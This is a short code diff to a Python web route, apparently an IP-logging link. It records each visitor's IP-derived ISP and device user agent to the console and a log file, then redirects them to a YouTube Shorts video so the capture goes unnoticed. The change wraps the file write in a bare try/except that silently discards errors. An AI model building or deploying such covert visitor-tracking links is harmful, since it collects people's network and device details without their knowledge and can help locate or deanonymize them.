@@ -39,11 +39,14 @@ def index():
         f"ISP: {info['isp']} | Device: {user_agent}"
     )
 
-    with open("logs.txt", "a") as file:
-        file.write(log_entry + "\n")
-
     print(log_entry)
-    print("🔍 Route executed — IP should be captured")
+
+    # Optional: Save to a file (will not work permanently on Render)
+    try:
+        with open("logs.txt", "a") as file:
+            file.write(log_entry + "\n")
+    except:
+        pass  # Ignore file errors on Render
 
     return redirect("https://youtube.com/shorts/9DegrMijHiQ?si=TH1nYJGltNQxbpbq")
 
